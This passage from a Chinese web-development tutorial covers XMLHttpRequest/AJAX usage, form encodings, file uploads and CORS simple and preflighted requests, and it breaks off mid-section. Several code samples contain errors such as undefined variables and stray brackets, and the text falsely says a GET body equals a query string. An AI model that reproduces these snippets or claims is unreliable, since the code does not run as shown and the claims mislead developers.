上面代码中，有一个字段是`Origin`，表示该请求的请求源（origin），即发自哪个域名。

正是因为有了`Origin`这个字段，所以 `WebSocket` 才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出如下回应。

```
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=
Sec-WebSocket-Protocol: chat
```

##### 4.3 CORS

`CORS` 是**跨源资源分享（Cross-Origin Resource Sharing）**的缩写。它是 W3C 标准，属于跨源 AJAX 请求的根本解决方法。相比 JSONP 只能发GET请求，CORS 允许任何类型的请求。

### 7.AJAX

AJAX(Async Javascript and XML)。浏览器与服务器之间，采用HTTP协议通信。用户在浏览器地址栏键入一个网址，或者通过网页表单向服务器提交内容，这时浏览器就会向服务器发出HTTP请求。

1999年，微软公司发布IE浏览器5.0版，第一次引入新功能：允许JavaScript脚本向服务器发起HTTP请求。这个功能当时并没有引起注意，直到2004年Gmail发布和2005年Google Map发布，才引起广泛重视。2005年2月，AJAX这个词第一次正式提出，指围绕这个功能进行开发的一整套做法。从此，AJAX成为脚本发起HTTP通信的代名词，W3C也在2006年发布了它的国际标准。

具体来说，AJAX包括以下几个步骤。

- --
- a.创建AJAX对象
- b.发出HTTP请求
- c.接收服务器传回的数据
- d.更新网页数据
- --

概括起来，就是一句话，AJAX通过原生的`XMLHttpRequest`对象发出HTTP请求，得到服务器返回的数据后，再进行处理。

AJAX可以是同步请求，也可以是异步请求。但是，大多数情况下，特指异步请求。因为同步的Ajax请求，对浏览器有“堵塞效应”。

#### 1.XMLHttpRequest对象

`XMLHttpRequest`对象用来在浏览器与服务器之间传送数据。

```
// 1.创建一个ajax的异步对象
let xhr = new XMLHttpRequest();

// 2.配置ajax参数
xhr.open(meth, url, sync / async, [user.name, [user.password]]);

//第一个参数
  //meth:请求方式"get/post"
  //  get系列:
    //  get : 一般是用来获取数据的
    //  delete : 一般用来从服务器删除某些资源
    //  head : 一般用来获取响应头，获取不到响应主体
  //  post系列:
    //  post : 一般都是客户端向服务器发送大量数据，比如表单提交、登录注册
    //  put : 一般用来将资源存放到服务器上

//第二个参数
  //url:请求地址（API）

//第三个参数
  //sync/async:是否异步（默认true）

//user.name,user.password
  //用来限制用户访问某些服务器，一般不设置，只在特殊需要时，才设置，并且访问时需要账户和密码才能访问服务器
```

然后，AJAX指定回调函数，监听通信状态（`readyState`属性）的变化。

`ajax.onreadystatechange = handleStateChange;`

一旦拿到服务器返回的数据，AJAX不会刷新整个网页，而是只更新相关部分，从而不打断用户正在做的事情。

注意，AJAX只能向同源网址（协议、域名、端口都相同）发出HTTP请求，如果发出跨源请求，就会报错。

虽然名字里面有XML，但是实际上，`XMLHttpRequest`可以报送各种数据，包括字符串和二进制，而且除了HTTP，它还支持通过其他协议传送（比如File和FTP）。

下面是`XMLHttpRequest`对象的典型用法。

```
var xhr = new XMLHttpRequest();

// 指定通信过程中状态改变时的回调函数
xhr.onreadystatechange = function(){
  // 通信成功时，状态值为4
  if (xhr.readyState === 4){
    if (xhr.status === 200){
      console.log(xhr.responseText);
    } else {
      console.error(xhr.statusText);
    }
  }
};

xhr.onerror = function (e) {
  console.error(xhr.statusText);
};

// open方式用于指定HTTP动词、请求的网址、是否异步
xhr.open('GET', '/endpoint', true);

//服务器与客户端交互的返回方式：
响应头(Response Header)：
xhr.getResponseHeader("请求数据名")  //获取响应头
xhr.getAllResponseHeaders()  //获取响应头全部信息
响应主体：
xhr.responseText

//客户端发送请求的多种方式：
请求头：
xhr.setRequestHeader()  //设置请求头信息（一般是设置请求数据类型）
xhr.timeout   //设置请求的超时时间，超过规定时间没有获得响应，请求失败，同时触发ontimeout事件（由超时行为触发），并且报错，

请求主体：

URL拼接查询参数：

// 发送HTTP请求
xhr.send(null);
```

#### 2.XMLHttpRequest实例的属性

##### 2.1 readyState

`readyState`是一个只读属性，用一个整数和对应的常量，表示`XMLHttpRequest`请求当前所处的状态。

- --
- 0，对应常量`UNSENT`，表示`XMLHttpRequest`实例已经生成，但是`open()`方法还没有被调用。
- --
- 1，对应常量`OPENED`，表示`send()`方法还没有被调用，`open()`执行后的状态，仍然可以使用`setRequestHeader()`，设定HTTP请求的头信息。
- --
- 2，对应常量`HEADERS_RECEIVED`，表示`send()`方法已经执行，并且头信息和状态码已经收到。
- --
- 3，对应常量`LOADING`，表示正在接收服务器传来的body部分的数据，如果`responseType`属性是`text`或者空字符串，`responseText`就会包含已经收到的部分信息。
- --
- 4，对应常量`DONE`，表示服务器数据已经完全接收，或者本次接收已经失败了。
- --

在通信过程中，每当发生状态变化的时候，`readyState`属性的值就会发生改变。这个值每一次变化，都会触发`readyStateChange`事件。

```
if (ajax.readyState == 4) {
  // Handle the response.
} else {
 // Show the 'Loading...' message or do nothing.
}
```

上面代码表示，只有`readyState`变为4时，才算确认请求已经成功，其他值都表示请求还在进行中。

##### 2.2 onreadystatechange

`onreadystatechange`属性指向一个回调函数，当`readystatechange`事件发生的时候，这个回调函数就会调用，并且`XMLHttpRequest`实例的`readyState`属性也会发生变化。

另外，如果使用`abort()`方法，终止`XMLHttpRequest`请求，`onreadystatechange`回调函数也会被调用。

```
var xmlhttp = new XMLHttpRequest();
xmlhttp.open( 'GET', 'http://example.com' , true );
xmlhttp.onreadystatechange = function () {
  if ( XMLHttpRequest.DONE != xmlhttp.readyState ) {
    return;
  }
  if ( 200 != xmlhttp.status ) {
    return;
  }
  console.log( xmlhttp.responseText );
};
xmlhttp.send();
```

##### 2.3 response

`response`属性为只读，返回接收到的数据体（即body部分）。它的类型可以是ArrayBuffer、Blob、Document、JSON对象、或者一个字符串，这由`XMLHttpRequest.responseType`属性的值决定。

如果本次请求没有成功或者数据不完整，该属性就会等于`null`。

##### 2.4 responseType

`responseType`属性用来指定服务器返回数据（`xhr.response`）的类型。

```
- ”“：字符串（默认值）
- “arraybuffer”：ArrayBuffer对象
- “blob”：Blob对象
- “document”：Document对象
- “json”：JSON对象
- “text”：字符串
```

`text`类型适合大多数情况，而且直接处理文本也比较方便，`document`类型适合返回XML文档的情况，`blob`类型适合读取二进制数据，比如图片文件。

```
var xhr = new XMLHttpRequest();
xhr.open('GET', '/path/to/image.png', true);
xhr.responseType = 'blob';

xhr.onload = function(e) {
  if (this.status == 200) {
    var blob = new Blob([this.response], {type: 'image/png'});
    // 或者
    var blob = oReq.response;
  }
};

xhr.send();
```

如果将这个属性设为`ArrayBuffer`，就可以按照数组的方式处理二进制数据。

```
var xhr = new XMLHttpRequest();
xhr.open('GET', '/path/to/image.png', true);
xhr.responseType = 'arraybuffer';

xhr.onload = function(e) {
  var uInt8Array = new Uint8Array(this.response);
  for (var i = 0, len = binStr.length; i < len; ++i) {
  // var byte = uInt8Array[i];
  }
};

xhr.send();
```

如果将这个属性设为“json”，支持JSON的浏览器（Firefox>9，chrome>30），就会自动对返回数据调用`JSON.parse()`方法。也就是说，你从`xhr.response`属性（注意，不是`xhr.responseText`属性）得到的不是文本，而是一个JSON对象。

XHR2支持Ajax的返回类型为文档，即`xhr.responseType=”document” `。这意味着，对于那些打开CORS的网站，我们可以直接用Ajax抓取网页，然后不用解析HTML字符串，直接对XHR回应进行DOM操作。

##### 2.5 responseText

`responseText`属性返回从服务器接收到的字符串，该属性为只读。如果本次请求没有成功或者数据不完整，该属性就会等于`null`。

如果服务器返回的数据格式是JSON，就可以使用`responseText`属性。

```
var data = ajax.responseText;
data = JSON.parse(data);
```

##### 2.6 responseXML

`responseXML`属性返回从服务器接收到的Document对象，该属性为只读。如果本次请求没有成功，或者数据不完整，或者不能被解析为XML或HTML，该属性等于`null`。

返回的数据会被直接解析为DOM对象。

```
/* 返回的XML文件如下
  <?xml version="1.0" encoding="utf-8" standalone="yes" ?>
  <book>
      <chapter id="1">(Re-)Introducing JavaScript</chapter>
      <chapter id="2">JavaScript in Action</chapter>
  </book>
*/

var data = ajax.responseXML;
var chapters = data.getElementsByTagName('chapter');
```

如果服务器返回的数据，没有明示`Content-Type`头信息等于`text/xml`，可以使用`overrideMimeType()`方法，指定`XMLHttpRequest`对象将返回的数据解析为XML。

##### 2.7 status

`status`属性为只读属性，表示本次请求所得到的HTTP状态码，它是一个整数。一般来说，如果通信成功的话，这个状态码是200。

- --
- 200, OK，访问正常
- 301, Moved Permanently，永久移动/永久重定向
- 302, Move temporarily，暂时移动/临时重定向或临时转义（服务器的负载均衡）
- 304, Not Modified，未修改/读取缓存(多次进行同一请求，改走缓存，以减轻服务器的访问压力)
- 307, Temporary Redirect，暂时重定向
- 400:请求参数错误
- 401, Unauthorized，未授权/权限错误
- 403, Forbidden，禁止访问
- 404, Not Found，未发现指定网址/请求地址不存在
- 500, Internal Server Error，服务器发生错误
- 503:服务器崩溃/超负荷
- --

> 基本上，只有2xx和304的状态码，表示服务器返回是正常状态。

```
if (ajax.readyState == 4) {
  if ( (ajax.status >= 200 && ajax.status < 300)
    || (ajax.status == 304) ) {
    // Handle the response.
  } else {
    // Status error!
  }
}
```

##### 2.8 statusText

`statusText`属性为只读属性，返回一个字符串，表示服务器发送的状态提示。不同于`status`属性，该属性包含整个状态信息，比如”200 OK“。

##### 2.9 timeout

`timeout`属性等于一个整数，表示多少毫秒后，如果请求仍然没有得到结果，就会自动终止。如果该属性等于0，就表示没有时间限制。

```
  var xhr = new XMLHttpRequest();
  xhr.ontimeout = function () {
    console.error("The request for " + url + " timed out.");
  };
  xhr.onload = function() {
    if (xhr.readyState === 4) {
      if (xhr.status === 200) {
        callback.apply(xhr, args);
      } else {
        console.error(xhr.statusText);
      }
    }
  };
  xhr.open("GET", url, true);
  xhr.timeout = timeout;
  xhr.send(null);
}
```

##### 2.10 事件监听接口

`XMLHttpRequest`第一版，只能对`onreadystatechange`这一个事件指定回调函数。该事件对所有情况作出响应。 `XMLHttpRequest`第二版允许对更多的事件指定回调函数。

- --
- onloadstart 请求发出
- onprogress 正在发送和加载数据
- onabort 请求被中止，比如用户调用了`abort()`方法
- onerror 请求失败
- onload 请求成功完成
- ontimeout 用户指定的时限到期，请求还未完成
- onloadend 请求完成，不管成果或失败
- --

```
xhr.onload = function() {
 var responseText = xhr.responseText;
 console.log(responseText);
 // process the response.
};

xhr.onerror = function() {
  console.log('There was an error!');
};
```

注意，如果发生网络错误（比如服务器无法连通），`onerror`事件无法获取报错信息，所以只能显示报错。

##### 2.11 withCredentials

`withCredentials`属性是一个布尔值，表示跨域请求时，用户信息（比如`Cookie`和认证的HTTP头信息）是否会包含在请求之中，默认为false。即向`example.com`发出跨域请求时，不会发送example.com设置在本机上的`Cookie`（如果有的话）。

如果你需要通过跨域AJAX发送`Cookie`，需要打开`withCredentials`。

`xhr.withCredentials = true;`

为了让这个属性生效，服务器必须显式返回`Access-Control-Allow-Credentials`这个头信息。

`Access-Control-Allow-Credentials: true`

`.withCredentials`属性打开的话，不仅会发送`Cookie`，还会设置远程主机指定的`Cookie`。注意，此时你的脚本还是遵守同源政策，无法 从`document.cookie`或者HTTP回应的头信息之中，读取这些`Cookie`。

#### 3.XMLHttpRequest实例的方法

##### 3.1 abort()

`abort`方法用来终止已经发出的HTTP请求。

```
ajax.open('GET', 'http://www.example.com/page.php', true);
var ajaxAbortTimer = setTimeout(function() {
  if (ajax) {
    ajax.abort();
    ajax = null;
  }
}, 5000);
```

上面代码在发出5秒之后，终止一个AJAX请求。

##### 3.2 getAllResponseHeaders()

`getAllResponseHeaders`方法返回服务器发来的所有HTTP头信息。格式为字符串，每个头信息之间使用CRLF分隔，如果没有受到服务器回应，该属性返回`null`。

##### 3.3 getResponseHeader()

`getResponseHeader`方法返回HTTP头信息指定字段的值，如果还没有收到服务器回应或者指定字段不存在，则该属性为`null`。

```
function getHeaderTime () {
  console.log(this.getResponseHeader("Last-Modified"));
}

var oReq = new XMLHttpRequest();
oReq.open("HEAD", "yourpage.html");
oReq.onload = getHeaderTime;
oReq.send();
```

如果有多个字段同名，则它们的值会被连接为一个字符串，每个字段之间使用“逗号+空格”分隔。

##### 3.4 open()

`XMLHttpRequest`对象的`open`方法用于指定发送HTTP请求的参数，它的使用格式如下，一共可以接受五个参数。

```
void open(
   string method,
   string url,
   optional boolean async,
   optional string user,
   optional string password
);
```

- --
- `method`：表示HTTP动词，比如“GET”、“POST”、“PUT”和“DELETE”。
- `url`: 表示请求发送的网址。
- `async`: 格式为布尔值，默认为true，表示请求是否为异步。如果设为false，则send()方法只有等到收到服务器返回的结果，才会有返回值。
- `user`：表示用于认证的用户名，默认为空字符串。
- `password`：表示用于认证的密码，默认为空字符串。
- --

> 如果对使用过`open()`方法的请求，再次使用这个方法，等同于调用`abort()`。

下面发送POST请求的例子。

```
xhr.open('POST', encodeURI('someURL'));
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.onload = function() {};
xhr.send(encodeURI('dataString'));
```

上面方法中，`open`方法向指定URL发出POST请求，`send`方法送出实际的数据。

下面是一个同步AJAX请求的例子。

```
var request = new XMLHttpRequest();
request.open('GET', '/bar/foo.txt', false);
request.send(null);

if (request.status === 200) {
  console.log(request.responseText);
}
```

##### 3.5 send()

`send`方法用于实际发出HTTP请求。如果不带参数，就表示HTTP请求只包含头信息，也就是只有一个URL，典型例子就是GET请求；如果带有参数，就表示除了头信息，还带有包含具体数据的信息体，典型例子就是POST请求。

```
ajax.open('GET'
  , 'http://www.example.com/somepage.php?id=' + encodeURIComponent(id)
  , true
);

// 等同于
var data = 'id=' + encodeURIComponent(id));
ajax.open('GET', 'http://www.example.com/somepage.php', true);
ajax.send(data);
```

上面代码中，GET请求的参数，可以作为查询字符串附加在URL后面，也可以作为`send`方法的参数。

下面是发送POST请求的例子。

```
var data = 'email='
  + encodeURIComponent(email)
  + '&password='
  + encodeURIComponent(password);
ajax.open('POST', 'http://www.example.com/somepage.php', true);
ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
ajax.send(data);
```

如果请求是异步的（默认为异步），该方法在发出请求后会立即返回。如果请求为同步，该方法只有等到收到服务器回应后，才会返回。

注意，所有`XMLHttpRequest`的监听事件，都必须在`send()`方法调用之前设定。

`send`方法的参数就是发送的数据。多种格式的数据，都可以作为它的参数。

```
void send();
void send(ArrayBufferView data);
void send(Blob data);
void send(Document data);
void send(String data);
void send(FormData data);
```

如果发送`Document`数据，在发送之前，数据会先被串行化。

发送二进制数据，最好使用`ArrayBufferView`或`Blob`对象，这使得通过Ajax上传文件成为可能。

下面是一个上传`ArrayBuffer`对象的例子。

```
function sendArrayBuffer() {
  var xhr = new XMLHttpRequest();
  var uInt8Array = new Uint8Array([1, 2, 3]);

  xhr.open('POST', '/server', true);
  xhr.onload = function(e) { ... };
  xhr.send(uInt8Array.buffer);
}
```

`FormData`类型可以用于构造表单数据。

```
var formData = new FormData();

formData.append('username', '张三');
formData.append('email', 'zhangsan@example.com');
formData.append('birthDate', 1940);

var xhr = new XMLHttpRequest();
xhr.open("POST", "/register");
xhr.send(formData);
```

上面的代码构造了一个formData对象，然后使用`send`方法发送。它的效果与点击下面表单的`submit`按钮是一样的。

```
<form id='registration' name='registration' action='/register'>
    <input type='text' name='username' value='张三'>
    <input type='email' name='email' value='zhangsan@example.com'>
    <input type='number' name='birthDate' value='1940'>
    <input type='submit' onclick='return sendForm(this.form);'>
</form>
```

`FormData`也可以将现有表单构造生成。

```
var formElement = document.querySelector("form");
var request = new XMLHttpRequest();
request.open("POST", "submitform.php");
request.send(new FormData(formElement));
```

`FormData`对象还可以对现有表单添加数据，这为我们操作表单提供了极大的灵活性。

```
function sendForm(form) {
    var formData = new FormData(form);
    formData.append('csrf', 'e69a18d7db1286040586e6da1950128c');

    var xhr = new XMLHttpRequest();
    xhr.open('POST', form.action, true);
    xhr.onload = function(e) {
        // ...
    };
    xhr.send(formData);

    return false;
}

var form = document.querySelector('#registration');
sendForm(form);
```

FormData对象也能用来模拟File控件，进行文件上传。

```
function uploadFiles(url, files) {
  var formData = new FormData();

  for (var i = 0, file; file = files[i]; ++i) {
    formData.append(file.name, file); // 可加入第三个参数，表示文件名
  }

  var xhr = new XMLHttpRequest();
  xhr.open('POST', url, true);
  xhr.onload = function(e) { ... };

  xhr.send(formData);  // multipart/form-data
}

document.querySelector('input[type="file"]').addEventListener('change', function(e) {
  uploadFiles('/server', this.files);
}, false);
```

`FormData`也可以加入JavaScript生成的文件。

```
// 添加JavaScript生成的文件
var content = '<a id="a"><b id="b">hey!</b></a>';
var blob = new Blob([content], { type: "text/xml"});
formData.append("webmasterfile", blob);
```

##### 3.6 setRequestHeader()

`setRequestHeader`方法用于设置HTTP头信息。该方法必须在`open()`之后、`send()`之前调用。如果该方法多次调用，设定同一个字段，则每一次调用的值会被合并成一个单一的值发送。

```
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.setRequestHeader('Content-Length', JSON.stringify(data).length);
xhr.send(JSON.stringify(data));
```

上面代码首先设置头信息`Content-Type`，表示发送JSON格式的数据；然后设置`Content-Length`，表示数据长度；最后发送JSON数据。

##### 3.7 overrideMimeType()

该方法用来指定服务器返回数据的MIME类型。该方法必须在`send()`之前调用。

传统上，如果希望从服务器取回二进制数据，就要使用这个方法，人为将数据类型伪装成文本数据。

```
var xhr = new XMLHttpRequest();
xhr.open('GET', '/path/to/image.png', true);

// 强制将MIME改为文本类型
xhr.overrideMimeType('text/plain; charset=x-user-defined');

xhr.onreadystatechange = function(e) {
  if (this.readyState == 4 && this.status == 200) {
    var binStr = this.responseText;
    for (var i = 0, len = binStr.length; i < len; ++i) {
      var c = binStr.charCodeAt(i);
      var byte = c & 0xff;  // 去除高位字节，留下低位字节
    }
  }
};

xhr.send();
```

上面代码中，因为传回来的是二进制数据，首先用`xhr.overrideMimeType`方法强制改变它的MIME类型，伪装成文本数据。字符集必需指定为“`x-user-defined`”，如果是其他字符集，浏览器内部会强制转码，将其保存成UTF-16的形式。字符集“`x-user-defined`”其实也会发生转码，浏览器会在每个字节前面再加上一个字节（0xF700-0xF7ff），因此后面要对每个字符进行一次与运算（`&`），将高位的8个位去除，只留下低位的8个位，由此逐一读出原文件二进制数据的每个字节。

这种方法很麻烦，在`XMLHttpRequest`版本升级以后，一般采用指定`responseType`的方法。

```
var xhr = new XMLHttpRequest();
xhr.onload = function(e) {
  var arraybuffer = xhr.response;
  // ...
}
xhr.open("GET", url);
xhr.responseType = "arraybuffer";
xhr.send();
```

#### 4.XMLHttpRequest实例的事件

##### 4.1 readyStateChange事件

`readyState`属性的值发生改变，就会触发`readyStateChange`事件。

我们可以通过`onReadyStateChange`属性，指定这个事件的回调函数，对不同状态进行不同处理。尤其是当状态变为4的时候，表示通信成功，这时回调函数就可以处理服务器传送回来的数据。

##### 4.2 progress事件

上传文件时，`XMLHTTPRequest`对象的`upload`属性有一个`progress`，会不断返回上传的进度。

假定网页上有一个`progress`元素。

`<progress min="0" max="100" value="0">0% complete</progress>`

文件上传时，对`upload`属性指定`progress`事件回调函数，即可获得上传的进度。

```
function upload(blobOrFile) {
  var xhr = new XMLHttpRequest();
  xhr.open('POST', '/server', true);
  xhr.onload = function(e) { ... };

  // Listen to the upload progress.
  var progressBar = document.querySelector('progress');
  xhr.upload.onprogress = function(e) {
    if (e.lengthComputable) {
      progressBar.value = (e.loaded / e.total) * 100;
      progressBar.textContent = progressBar.value; // Fallback for unsupported browsers.
    }
  };

  xhr.send(blobOrFile);
}

upload(new Blob(['hello world'], {type: 'text/plain'}));
```

##### 4.3 load事件、error事件、abort事件

`load`事件表示服务器传来的数据接收完毕，`error`事件表示请求出错，`abort`事件表示请求被中断。

```
var xhr = new XMLHttpRequest();

xhr.addEventListener("progress", updateProgress);
xhr.addEventListener("load", transferComplete);
xhr.addEventListener("error", transferFailed);
xhr.addEventListener("abort", transferCanceled);

xhr.open();

function updateProgress (oEvent) {
  if (oEvent.lengthComputable) {
    var percentComplete = oEvent.loaded / oEvent.total;
    // ...
  } else {
    // 回应的总数据量未知，导致无法计算百分比
  }
}

function transferComplete(evt) {
  console.log("The transfer is complete.");
}

function transferFailed(evt) {
  console.log("An error occurred while transferring the file.");
}

function transferCanceled(evt) {
  console.log("The transfer has been canceled by the user.");
}
```

##### 4.4 loadend事件

`abort`、`load`和`error`这三个事件，会伴随一个`loadend`事件，表示请求结束，但不知道其是否成功。

```
req.addEventListener("loadend", loadEnd);

function loadEnd(e) {
  alert("请求结束（不知道是否成功）");
}
```

#### 5."get"和"post"请求的区别

1).传递参数的方式

- get 请求的参数放置在URL上，通过"`？参数=值&参数=值`"的形式传递，`xhr.open("get","url")`；
- post 请求的参数放置在请求主体中，`xhr.send('参数=值&参数=值')`

2).参数大小限制
浏览器对URL大小有限制，超出部分会自动截取；post的请求主体没有大小限制（实际操作中会有一定程度上的限制，过大的请求数据会分次请求，以保证请求速度）；

3).安全性
get 请求的参数显示在URL上，安全性极低；一般考虑安全性时，会使用 post 请求

4).缓存
get 请求的 URL 问号传参很容易走缓存，一般在 URL 后面拼接一个时间戳，来防止缓存；post 请求不会走缓存；

#### 6.文件上传

HTML网页的`<form>`元素能够以四种格式，向服务器发送数据。

1).使用POST方法，将`enctype`属性设为`application/x-www-form-urlencoded`，这是默认方法。

```
<form action="register.php" method="post" onsubmit="AJAXSubmit(this); return false;">
</form>
```

2).使用POST方法，将`enctype`属性设为`text/plain`。

```
<form action="register.php" method="post" enctype="text/plain" onsubmit="AJAXSubmit(this); return false;">
</form>
```

3).使用POST方法，将`enctype`属性设为`multipart/form-data`。

```
<form action="register.php" method="post" enctype="multipart/form-data" onsubmit="AJAXSubmit(this); return false;">
</form>
```

4).使用GET方法，`enctype`属性将被忽略。

```
<form action="register.php" method="get" onsubmit="AJAXSubmit(this); return false;">
</form>
```

某个表单有两个字段，分别是foo和baz，其中foo字段的值等于bar，baz字段的值一个分为两行的字符串。上面四种方法，都可以将这个表单发送到服务器。

- --

第一种方法是默认方法，POST发送，`Encoding type`为`application/x-www-form-urlencoded`。

```
Content-Type: application/x-www-form-urlencoded

foo=bar&baz=The+first+line.&#37;0D%0AThe+second+line.%0D%0A
```

- --

第二种方法是POST发送，`Encoding type`为`text/plain`。

```
Content-Type: text/plain

foo=bar
baz=The first line.
The second line.
```

- --

第三种方法是POST发送，`Encoding type`为`multipart/form-data`。

```
Content-Type: multipart/form-data; boundary=---------------------------314911788813839

-----------------------------314911788813839
Content-Disposition: form-data; name="foo"

bar
-----------------------------314911788813839
Content-Disposition: form-data; name="baz"

The first line.
The second line.

-----------------------------314911788813839--
```

- --

第四种方法是GET请求。

`?foo=bar&baz=The%20first%20line.%0AThe%20second%20line.`

- --

通常，我们使用file控件实现文件上传。

```
<form id="file-form" action="handler.php" method="POST">
  <input type="file" id="file-select" name="photos[]" multiple/>
  <button type="submit" id="upload-button">上传</button>
</form>
```

上面HTML代码中，file控件的`multiple`属性，指定可以一次选择多个文件；如果没有这个属性，则一次只能选择一个文件。

file对象的`files`属性，返回一个`FileList`对象，包含了用户选中的文件。

```
var fileSelect = document.getElementById('file-select');
var files = fileSelect.files;
```

然后，新建一个`FormData`对象的实例，用来模拟发送到服务器的表单数据，把选中的文件添加到这个对象上面。

```
var formData = new FormData();

for (var i = 0; i < files.length; i++) {
  var file = files[i];

  if (!file.type.match('image.*')) {
    continue;
  }

  formData.append('photos[]', file, file.name);
}
```

上面代码中的`FormData`对象的`append`方法，除了可以添加文件，还可以添加二进制对象（Blob）或者字符串。

```
// Files
formData.append(name, file, filename);

// Blobs
formData.append(name, blob, filename);

// Strings
formData.append(name, value);
```

`append`方法的第一个参数是表单的控件名，第二个参数是实际的值，第三个参数是可选的，通常是文件名。

最后，使用Ajax方法向服务器上传文件。

```
var xhr = new XMLHttpRequest();

xhr.open('POST', 'handler.php', true);

xhr.onload = function () {
  if (xhr.status !== 200) {
    alert('An error occurred!');
  }
};

xhr.send(formData);
```

> 目前，各大浏览器（包括IE 10）都支持Ajax上传文件。

除了使用`FormData`接口上传，也可以直接使用File API上传。

```
var file = document.getElementById('test-input').files[0];
var xhr = new XMLHttpRequest();

xhr.open('POST', 'myserver/uploads');
xhr.setRequestHeader('Content-Type', file.type);
xhr.send(file);
```

可以看到，上面这种写法比FormData的写法，要简单很多。

### 8.CORS通信

CORS是一个W3C标准，全称是“跨域资源共享”（Cross-origin resource sharing）。

它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。

#### 1.简介

CORS需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE浏览器不能低于IE10。

整个CORS通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。浏览器一旦发现AJAX请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。

因此，实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。

#### 2.两种请求

浏览器将CORS请求分成两类：**简单请求（simple request）**和**非简单请求（not-so-simple request）**。

只要同时满足以下两大条件，就属于简单请求。

1).请求方法是以下三种方法之一。

- --
- HEAD
- GET
- POST
- --

2).HTTP的头信息不超出以下几种字段。

- --
- Accept
- Accept-Language
- Content-Language
- Last-Event-ID
- Content-Type：只限于三个值`application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain`
- --

凡是不同时满足上面两个条件，就属于非简单请求。

浏览器对这两种请求的处理，是不一样的。

#### 3.简单请求

##### 3.1 基本流程

对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个`Origin`字段。

下面是一个例子，浏览器发现这次跨源AJAX请求是简单请求，就自动在头信息之中，添加一个`Origin`字段。

```
GET /cors HTTP/1.1
Origin: http://api.bob.com
Host: api.alice.com
Accept-Language: en-US
Connection: keep-alive
User-Agent: Mozilla/5.0...
```

上面的头信息中，`Origin`字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。

如果`Origin`指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含`Access-Control-Allow-Origin`字段，就知道出错了，从而抛出一个错误，被`XMLHttpRequest`的`onerror`回调函数捕获。

> 注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。

如果`Origin`指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。

```
Access-Control-Allow-Origin: http://api.bob.com
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: FooBar
Content-Type: text/html; charset=utf-8
```

上面的头信息之中，有三个与CORS请求相关的字段，都以`Access-Control-`开头。

1).Access-Control-Allow-Origin

该字段是必须的。它的值要么是请求时`Origin`字段的值，要么是一个*，表示接受任意域名的请求。

2).Access-Control-Allow-Credentials

该字段可选。它的值是一个布尔值，表示是否允许发送`Cookie`。默认情况下，`Cookie`不包括在CORS请求之中。设为true，即表示服务器明确许可，`Cookie`可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送`Cookie`，删除该字段即可。

3).Access-Control-Expose-Headers

该字段可选。CORS请求时，`XMLHttpRequest`对象的`getResponseHeader()`方法只能拿到6个基本字段：`Cache-Control`、`Content-Language`、`Content-Type`、`Expires`、`Last-Modified`、`Pragma`。如果想拿到其他字段，就必须在`Access-Control-Expose-Headers`里面指定。上面的例子指定，`getResponseHeader('FooBar')`可以返回`FooBar`字段的值。

##### 3.2 withCredentials 属性

上面说到，CORS请求默认不包含`Cookie`信息（以及HTTP认证信息等）。如果需要包含`Cookie`信息，一方面要服务器同意，指定`Access-Control-Allow-Credentials`字段。

`Access-Control-Allow-Credentials: true`

另一方面，开发者必须在AJAX请求中打开`withCredentials`属性。

```
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
```

否则，即使服务器同意发送`Cookie`，浏览器也不会发送。或者，服务器要求设置`Cookie`，浏览器也不会处理。

但是，如果省略`withCredentials`设置，有的浏览器还是会一起发送`Cookie`。这时，可以显式关闭`withCredentials`。

`xhr.withCredentials = false;`

需要注意的是，如果要发送`Cookie`，`Access-Control-Allow-Origin`就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，`Cookie`依然遵循同源政策，只有用服务器域名设置的`Cookie`才会上传，其他域名的`Cookie`并不会上传，且（跨源）原网页代码中的`document.cookie`也无法读取服务器域名下的`Cookie`。

#### 4.非简单请求

##### 4.1 预检请求

非简单请求是那种对服务器有特殊要求的请求，比如请求方法是PUT或DELETE，或者`Content-Type`字段的类型是`application/json`。

非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为**预检（preflight）请求**。

浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的`XMLHttpRequest`请求，否则就报错。

下面是一段浏览器的JavaScript脚本。

```
var url = 'http://api.alice.com/cors';
var xhr = new XMLHttpRequest();
xhr.open('PUT', url, true);
xhr.setRequestHeader('X-Custom-Header', 'value');
xhr.send();
```

上面代码中，HTTP请求的方法是PUT，并且发送一个自定义头信息`X-Custom-Header`。

浏览器发现，这是一个非简单请求，就自动发出一个“预检”请求，要求服务器确认可以这样请求。下面是这个“预检”请求的HTTP头信息。

```
OPTIONS /cors HTTP/1.1
Origin: http://api.bob.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: X-Custom-Header
Host: api.alice.com
Accept-Language: en-US
Connection: keep-alive
User-Agent: Mozilla/5.0...
```

“预检”请求用的请求方法是OPTIONS，表示这个请求是用来询问的。头信息里面，关键字段是`Origin`，表示请求来自哪个源。

除了`Origin`字段，“预检”请求的头信息包括两个特殊字段。

1).Access-Control-Request-Method

该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是PUT。

2).Access-Control-Request-Headers

